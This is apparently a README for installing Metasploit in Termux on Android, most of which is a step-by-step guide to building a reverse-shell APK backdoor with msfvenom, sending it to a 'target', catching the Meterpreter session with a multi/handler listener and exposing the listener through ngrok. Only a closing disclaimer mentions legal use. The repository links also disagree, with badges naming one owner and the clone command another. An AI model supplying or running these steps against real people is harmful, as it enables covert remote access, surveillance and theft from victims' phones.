# Metasploit Framework 6 in Termux
[![GitLab Testing status](https://gitlab.com/gushmazuko/metasploit_in_termux/badges/master/pipeline.svg)](https://gitlab.com/gushmazuko/metasploit_in_termux/-/pipelines) ![GitHub Repo stars](https://img.shields.io/github/stars/gushmazuko/metasploit_in_termux?style=social) [![](https://img.shields.io/badge/GitLab-Mirror-succes?link=https://gitlab.com/gushmazuko/metasploit_in_termux)](https://gitlab.com/gushmazuko/metasploit_in_termux)

![Metasploit 6 running](https://i.postimg.cc/hv5xQJkd/photo-2025-07-15-13-13-51.jpg)


---

## 📱 Requirements

- Android Device
- Termux App (latest version from [F-Droid](https://f-droid.org/en/packages/com.termux/))
- Minimum 2GB Free Storage
- Stable Internet Connection

---

## ⚙️ Installation Steps

```bash
pkg update && pkg upgrade -y
pkg install git -y
git clone https://github.com/Pythonds100/metasploit_in_termux
cd metasploit_in_termux
bash metasploit.sh
```

This script will download and install the latest version of Metasploit Framework with all required dependencies.

---

## 🧰 Launching Metasploit

Once installed, open it anytime by typing:

```bash
msfconsole
```

Wait for it to load fully.

---

## 💣 How to Create a Payload (APK Backdoor)

Generate a malicious APK file using the following command:

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=<your-port> -o /sdcard/payload.apk
```

🔁 Replace:

- `<your-ip>` → Your local or public IP address  
- `<your-port>` → Any open port (e.g., `4444`)

**Example:**

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -o /sdcard/payload.apk
```

Send this APK to the target. When they install and open it, you will get access.

---

## 🧲 Set Up the Listener (Exploit Handler)

Start Metasploit and run:

```bash
msfconsole
```

Then type the following:

```bash
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST <your-ip>
set LPORT <your-port>
exploit
```

Wait for the victim to run the payload. You’ll receive a Meterpreter session upon successful connection.

---

## 🌐 How to Find Your IP Address

### ✅ For Local Network (WiFi):

```bash
ip a
```
Look for `inet` IP like `192.168.x.x`

### ✅ For Public IP:

Go to: [https://whatismyipaddress.com](https://whatismyipaddress.com)

---

## 🌍 Optional: Use Ngrok (for Internet access)

If you're behind NAT or want to use Metasploit over the internet, use **Ngrok**.

### 🔹 Step 1: Install Ngrok

```bash
pkg install wget unzip -y
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-linux-arm.zip
unzip ngrok-stable-linux-arm.zip
chmod +x ngrok
```

### 🔹 Step 2: Start a Tunnel

```bash
./ngrok tcp 4444
```

Ngrok will give you something like `tcp://0.tcp.ngrok.io:12345`

Use:

- `LHOST = 0.tcp.ngrok.io`
- `LPORT = 12345`

in your payload and listener.

---

## 🙋 Author & Credits

**Developed by:**  
- 📺 YouTube: [@𝐃𝐔𝐑𝐆𝐄𝐒𝐇 𝐄𝐗𝐏𝐋𝐎𝐈𝐓𝐒](https://youtube.com/@durgeshexploits)
- 💬 Telegram: [@𝐃𝐔𝐑𝐆𝐄𝐒𝐇 𝐄𝐗𝐏𝐋𝐎𝐈𝐓𝐒](https://t.me/ExploitsAbout)

---

## ⚠️ Disclaimer

> 🛑 This tool is made for **educational purposes only**.  
> Unauthorized access to devices or systems is **illegal**.  
> The developer is **not responsible** for any kind of misuse.  
> Use this only in legal environments like **your own devices, lab setups, or with permission**.

---

## 🌟 Support

If you find this project useful, please consider giving it a ⭐ on GitHub:

```bash
git clone https://github.com/Pythonds100/metasploit_in_termux
```

Pull requests and suggestions are welcome!

---
